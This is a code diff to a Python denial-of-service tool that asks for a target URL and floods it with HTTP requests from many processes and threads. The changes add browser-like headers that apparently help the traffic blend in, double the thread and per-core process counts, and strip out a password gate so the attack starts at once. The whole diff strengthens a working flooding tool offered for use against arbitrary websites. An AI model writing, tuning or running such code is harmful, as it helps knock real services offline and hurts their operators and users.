@@ -32,22 +32,9 @@ def get_random_headers():
     return {
         "User-Agent": random.choice(USER_AGENTS),
         "Referer": random.choice(REFERERS),
+        "Accept-Language": "en-US,en;q=0.9",
+        "Accept-Encoding": "gzip, deflate, br",
     }
-
-def display_banner():
-    banner_text = "j"
-    for char in banner_text:
-        print(Fore.GREEN + char + Style.RESET_ALL)
-        time.sleep(0.05)
-
-def password_prompt():
-    password = input("Enter password: ")
-    if password == "j":
-        print(Fore.GREEN + "Correct password! Opening attack menu..." + Style.RESET_ALL)
-        start_attack()
-    else:
-        print(Fore.RED + "Wrong password! Exiting..." + Style.RESET_ALL)
-        exit()
 
 def send_requests_threaded(target, stop_flag):
     session = requests.Session()
@@ -60,7 +47,7 @@ def send_requests_threaded(target, stop_flag):
             except requests.exceptions.RequestException:
                 pass
 
-    num_threads = 5000  # زيادة عدد الخيوط بشكل كبير
+    num_threads = 10000  # زيادة عدد الخيوط بشكل كبير
 
     with ThreadPoolExecutor(max_workers=num_threads) as executor:
         futures = [executor.submit(send_request) for _ in range(num_threads)]
@@ -94,9 +81,6 @@ def send_requests_pycurl(target, stop_flag):
         finally:
             c.close()
 
-def show_attack_animation():
-    print("Loading...")
-
 def start_attack():
     try:
         target = input("Target URL: ")
@@ -110,8 +94,6 @@ def execute_attack(target):
 
     print(f"Starting continuous attack on {target} using {total_cores} cores...")
 
-    show_attack_animation()
-
     processes = []
 
     with stop_attack_flag.get_lock():
@@ -119,7 +101,7 @@ def execute_attack(target):
 
     try:
         # زيادة عدد العمليات بشكل كبير
-        for i in range(total_cores * 10):  # استخدام 10 عمليات لكل نواة
+        for i in range(total_cores * 20):  # استخدام 20 عمليات لكل نواة
             process = multiprocessing.Process(target=send_requests_threaded, args=(target, stop_attack_flag))
             processes.append(process)
             process.start()
@@ -147,8 +129,7 @@ def execute_attack(target):
 
 def main():
     try:
-        display_banner()
-        password_prompt()
+        start_attack()
     except Exception as e:
         print(f"Error: {str(e)}")
 
